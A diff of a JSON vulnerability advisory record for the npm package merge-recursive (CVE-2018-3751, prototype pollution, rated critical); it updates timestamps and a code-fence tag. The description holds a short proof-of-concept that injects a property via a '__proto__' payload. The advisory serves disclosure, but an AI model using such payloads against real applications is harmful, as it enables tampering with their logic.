@@ -1,6 +1,6 @@
 {
   "Severity": "CRITICAL",
-  "UpdatedAt": "2020-08-31T18:33:10Z",
+  "UpdatedAt": "2023-09-12T18:47:20Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "merge-recursive"
@@ -33,12 +33,12 @@
         "Value": "CVE-2018-3751"
       }
     ],
-    "Description": "All versions of `merge-recursive` are vulnerable to Prototype Pollution. When malicious user input is merged with another object it allows the attacker to modify the prototype of Object via `__proto__` causing the addition or modification of an existing property.\n\nProof of concept:\n\n```\nvar merge = require('merge-recursive').recursive;\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\n\nvar a = {};\nconsole.log(\"Before : \" + a.oops);\nmerge({}, JSON.parse(malicious_payload));\nconsole.log(\"After : \" + a.oops);\n```\n\n\n## Recommendation\n\nThere is currently no fix available. ",
+    "Description": "All versions of `merge-recursive` are vulnerable to Prototype Pollution. When malicious user input is merged with another object it allows the attacker to modify the prototype of Object via `__proto__` causing the addition or modification of an existing property.\n\nProof of concept:\n\n```js\nvar merge = require('merge-recursive').recursive;\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\n\nvar a = {};\nconsole.log(\"Before : \" + a.oops);\nmerge({}, JSON.parse(malicious_payload));\nconsole.log(\"After : \" + a.oops);\n```\n\n\n## Recommendation\n\nThere is currently no fix available. ",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-09-18T13:46:06Z",
     "Severity": "CRITICAL",
     "Summary": "Prototype Pollution in merge-recursive",
-    "UpdatedAt": "2023-01-09T05:02:51Z",
+    "UpdatedAt": "2023-09-12T18:47:20Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 9.8,
